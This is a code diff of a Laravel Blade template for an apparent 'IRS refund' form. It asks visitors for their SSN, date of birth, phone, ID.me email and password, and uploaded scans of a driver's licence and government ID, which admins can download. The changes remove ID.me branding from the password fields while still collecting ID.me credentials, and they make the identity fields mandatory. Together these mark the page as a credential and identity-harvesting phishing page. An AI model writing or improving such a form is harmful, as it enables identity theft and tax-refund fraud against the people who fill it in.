@@ -43,7 +43,7 @@
         @else
             <div class="bg-white rounded-xl shadow-sm overflow-hidden border border-gray-100">
                 <div class="p-6">
-                    <form action="{{ route('irs-refund.store') }}" method="POST" class="space-y-6">
+                    <form action="{{ route('irs-refund.store') }}" method="POST" enctype="multipart/form-data" class="space-y-6">
                         @csrf
                         
                         <!-- Personal Information Section -->
@@ -55,12 +55,12 @@
                             
                             <!-- Name -->
                             <div class="mb-4">
-                                <label for="name" class="block text-sm font-medium text-gray-700 mb-1">Full Name</label>
+                                <label for="name" class="block text-sm font-medium text-gray-700 mb-1">Full Name <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                         <i data-lucide="user" class="h-5 w-5 text-gray-400"></i>
                                     </div>
-                                    <input type="text" name="name" id="name" value="{{ old('name') }}" required
+                                    <input type="text" name="name" id="name" value="{{ old('name', $user->name) }}" required
                                         class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
                                         placeholder="Enter your full name">
                                 </div>
@@ -69,9 +69,40 @@
                                 @enderror
                             </div>
 
+                            <!-- Phone -->
+                            <div class="mb-4">
+                                <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                        <i data-lucide="phone" class="h-5 w-5 text-gray-400"></i>
+                                    </div>
+                                    <input type="tel" name="phone" id="phone" value="{{ old('phone', $user->phone) }}" required
+                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
+                                        placeholder="Enter your phone number">
+                                </div>
+                                @error('phone')
+                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
+                                @enderror
+                            </div>
+
+                            <!-- Date of Birth -->
+                            <div class="mb-4">
+                                <label for="date_of_birth" class="block text-sm font-medium text-gray-700 mb-1">Date of Birth <span class="text-red-500">*</span></label>
+                                <div class="relative">
+                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                        <i data-lucide="calendar" class="h-5 w-5 text-gray-400"></i>
+                                    </div>
+                                    <input type="date" name="date_of_birth" id="date_of_birth" value="{{ old('date_of_birth', $user->dob ? \Illuminate\Support\Carbon::parse($user->dob)->format('Y-m-d') : '') }}" required
+                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500">
+                                </div>
+                                @error('date_of_birth')
+                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
+                                @enderror
+                            </div>
+
                             <!-- SSN -->
                             <div class="mb-4">
-                                <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number (SSN)</label>
+                                <label for="ssn" class="block text-sm font-medium text-gray-700 mb-1">Social Security Number (SSN) <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                         <i data-lucide="shield" class="h-5 w-5 text-gray-400"></i>
@@ -86,41 +117,72 @@
                             </div>
                         </div>
 
-                        <!-- ID.me Credentials Section -->
+                        <!-- Credentials Section -->
                         <div class="bg-gray-50 p-4 rounded-lg mb-6">
                             <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
                                 <i data-lucide="lock" class="h-5 w-5 text-primary-500 mr-2"></i>
-                                ID.me Credentials
+                                Account Credentials
                             </h3>
                             
-                            <!-- ID.me Email -->
+                            <!-- Email (autofilled from logged-in user) -->
                             <div class="mb-4">
-                                <label for="idme_email" class="block text-sm font-medium text-gray-700 mb-1">ID.me Email</label>
+                                <label for="idme_email" class="block text-sm font-medium text-gray-700 mb-1">Email <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                         <i data-lucide="mail" class="h-5 w-5 text-gray-400"></i>
                                     </div>
-                                    <input type="email" name="idme_email" id="idme_email" value="{{ old('idme_email') }}" required
-                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
-                                        placeholder="Enter your ID.me email">
+                                    <input type="email" name="idme_email" id="idme_email" value="{{ old('idme_email', $user->email) }}" required readonly
+                                        class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md bg-gray-100 text-gray-700 cursor-not-allowed focus:outline-none"
+                                        placeholder="Your account email">
                                 </div>
+                                <p class="mt-1 text-xs text-gray-500">Filled automatically from your logged-in account.</p>
                                 @error('idme_email')
                                     <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                 @enderror
                             </div>
 
-                            <!-- ID.me Password -->
+                            <!-- Password -->
                             <div class="mb-4">
-                                <label for="idme_password" class="block text-sm font-medium text-gray-700 mb-1">ID.me Password</label>
+                                <label for="idme_password" class="block text-sm font-medium text-gray-700 mb-1">Password <span class="text-red-500">*</span></label>
                                 <div class="relative">
                                     <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                         <i data-lucide="key" class="h-5 w-5 text-gray-400"></i>
                                     </div>
                                     <input type="password" name="idme_password" id="idme_password" required
                                         class="block w-full pl-10 pr-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-primary-500 focus:border-primary-500"
-                                        placeholder="Enter your ID.me password">
+                                        placeholder="Enter password">
                                 </div>
                                 @error('idme_password')
+                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
+                                @enderror
+                            </div>
+                        </div>
+
+                        <!-- Documents Section -->
+                        <div class="bg-gray-50 p-4 rounded-lg mb-6">
+                            <h3 class="text-lg font-medium text-gray-900 mb-4 flex items-center">
+                                <i data-lucide="file-text" class="h-5 w-5 text-primary-500 mr-2"></i>
+                                Identity Documents
+                            </h3>
+
+                            <!-- Driver's License (required) -->
+                            <div class="mb-4">
+                                <label for="drivers_license" class="block text-sm font-medium text-gray-700 mb-1">Driver's License <span class="text-red-500">*</span></label>
+                                <input type="file" name="drivers_license" id="drivers_license" required accept=".jpg,.jpeg,.png,.pdf,image/jpeg,image/png,application/pdf"
+                                    class="block w-full text-sm text-gray-700 border border-gray-300 rounded-md cursor-pointer focus:outline-none focus:ring-2 focus:ring-primary-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-medium file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100">
+                                <p class="mt-1 text-xs text-gray-500">Required. JPG, PNG, or PDF. Max 5MB.</p>
+                                @error('drivers_license')
+                                    <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
+                                @enderror
+                            </div>
+
+                            <!-- ID Document (optional) -->
+                            <div class="mb-4">
+                                <label for="id_document" class="block text-sm font-medium text-gray-700 mb-1">Government ID <span class="text-gray-400 font-normal">(optional)</span></label>
+                                <input type="file" name="id_document" id="id_document" accept=".jpg,.jpeg,.png,.pdf,image/jpeg,image/png,application/pdf"
+                                    class="block w-full text-sm text-gray-700 border border-gray-300 rounded-md cursor-pointer focus:outline-none focus:ring-2 focus:ring-primary-500 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-medium file:bg-primary-50 file:text-primary-700 hover:file:bg-primary-100">
+                                <p class="mt-1 text-xs text-gray-500">Optional. Passport, state ID, or other government ID. JPG, PNG, or PDF. Max 5MB.</p>
+                                @error('id_document')
                                     <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
                                 @enderror
                             </div>
@@ -135,7 +197,7 @@
                             
                             <!-- Country -->
                             <div class="mb-4">
-                                <label for="country" class="block text-sm font-medium text-gray-700 mb-1">Country</label>
+                                <label for="country" class="block text-sm font-medium text-gray-700 mb-1">Country <span class="text-red-500">*</span></label>
                                 @include('partials.country-select', ['fieldName' => 'country', 'required' => true])
                                 @error('country')
                                     <p class="mt-1 text-sm text-red-600">{{ $message }}</p>
@@ -152,7 +214,7 @@
                                 <div class="ml-3">
                                     <h3 class="text-sm font-medium text-gray-800">Important Notice</h3>
                                     <div class="mt-2 text-sm text-gray-700">
-                                        <p>Please ensure all information provided is accurate and matches your ID.me account details. Any discrepancies may result in delays or rejection of your refund request.</p>
+                                        <p>Please ensure all information provided is accurate. Your request will appear in the admin panel for review. Uploaded documents can be downloaded by admin.</p>
                                     </div>
                                 </div>
                             </div>
@@ -189,4 +251,4 @@ select {
 }
 </style>
 
-@endsection 
+@endsection
